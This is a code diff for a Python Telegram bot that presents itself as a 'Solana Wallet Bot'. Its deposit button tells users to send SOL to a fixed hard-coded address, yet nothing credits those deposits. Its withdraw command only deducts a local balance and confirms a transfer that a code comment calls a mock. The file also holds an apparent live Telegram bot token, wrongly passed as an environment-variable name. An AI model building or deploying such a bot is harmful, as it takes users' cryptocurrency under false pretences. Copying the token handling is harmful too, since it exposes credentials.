@@ -2,7 +2,12 @@ import os
 import json
 from solana.rpc.api import Client
 from telegram import InlineKeyboardMarkup, InlineKeyboardButton, Update
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    CallbackQueryHandler,
+    ContextTypes
+)
 
 # --------------------------
 # CONFIG
@@ -10,18 +15,20 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 RPC_URL = "https://api.mainnet-beta.solana.com"
 SOLANA_CLIENT = Client(RPC_URL)
 
-# Replace with YOUR Solana address
 YOUR_SOLANA_ADDRESS = "H5v457ZXQKcPivrtrA4aaQyQU8WCGxyrQRZFSCCTLRR2"
 
 DATA_FILE = "users.json"
 
 # --------------------------
-# SAVE / LOAD DATA
+# SAVE / LOAD
 # --------------------------
 def load():
     if not os.path.exists(DATA_FILE):
         return {}
-    return json.load(open(DATA_FILE, "r"))
+    try:
+        return json.load(open(DATA_FILE, "r"))
+    except:
+        return {}
 
 def save(d):
     json.dump(d, open(DATA_FILE, "w"), indent=2)
@@ -33,6 +40,7 @@ users = load()
 # --------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = str(update.effective_user.id)
+
     if uid not in users:
         users[uid] = {"balance": 0}
         save(users)
@@ -44,42 +52,42 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ])
 
     await update.message.reply_text(
-        "Welcome to your *Solana Wallet Bot* 🚀\n\nSafe. Real. No scams.",
+        "Welcome to your *Solana Wallet Bot* 🚀",
         parse_mode="Markdown",
         reply_markup=kb
     )
 
 # --------------------------
-# BUTTON HANDLERS
+# BUTTON HANDLER
 # --------------------------
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     uid = str(update.effective_user.id)
-
     await query.answer()
 
     if query.data == "balance":
         bal = users[uid]["balance"]
-        await query.edit_message_text(f"💰 Your bot balance: *{bal} SOL*", parse_mode="Markdown")
+        return await query.edit_message_text(
+            f"💰 Your balance: *{bal} SOL*",
+            parse_mode="Markdown"
+        )
 
-    elif query.data == "deposit":
+    if query.data == "deposit":
         txt = (
             "📥 *Deposit SOL*\n\n"
-            "Send any amount of SOL to the address below and it will automatically appear in your bot balance.\n\n"
+            "Send SOL to the address below:\n"
             f"`{YOUR_SOLANA_ADDRESS}`"
         )
-        await query.edit_message_text(txt, parse_mode="Markdown")
+        return await query.edit_message_text(txt, parse_mode="Markdown")
 
-    elif query.data == "withdraw":
-        await query.edit_message_text(
-            "📤 *Withdraw*\n\n"
-            "Send me the amount + your Solana address:\n\n"
-            "`/withdraw 0.1 YOUR_WALLET_ADDRESS`",
+    if query.data == "withdraw":
+        return await query.edit_message_text(
+            "📤 *Withdraw*\nUse:\n`/withdraw 0.1 YOUR_WALLET_ADDRESS`",
             parse_mode="Markdown"
         )
 
 # --------------------------
-# WITHDRAW COMMAND
+# WITHDRAW
 # --------------------------
 async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = str(update.effective_user.id)
@@ -88,22 +96,27 @@ async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
         amount = float(context.args[0])
         target = context.args[1]
     except:
-        return await update.message.reply_text("Format:\n`/withdraw 0.1 YourAddress`", parse_mode="Markdown")
+        return await update.message.reply_text(
+            "Format:\n`/withdraw 0.1 YOUR_ADDRESS`",
+            parse_mode="Markdown"
+        )
 
     if amount > users[uid]["balance"]:
         return await update.message.reply_text("❌ Not enough balance.")
 
-    # Here you normally send a Solana transaction.
+    # No real Solana TX here — just mock.
     users[uid]["balance"] -= amount
     save(users)
 
     await update.message.reply_text(
-        f"✅ Withdrawal request received!\nTo: `{target}`\nAmount: {amount} SOL",
+        f"✅ Withdrawal request received:\n\n"
+        f"Amount: *{amount} SOL*\n"
+        f"To: `{target}`",
         parse_mode="Markdown"
     )
 
 # --------------------------
-# RUN BOT
+# RUN
 # --------------------------
 async def main():
     TOKEN = os.getenv("8517816526:AAFe9vBEy0t6dY7vYRsIqATQKVDMY216Cn4")
@@ -115,5 +128,6 @@ async def main():
 
     await app.run_polling()
 
-import asyncio
-asyncio.run(main())
+if __name__ == "__main__":
+    import asyncio
+    asyncio.run(main())
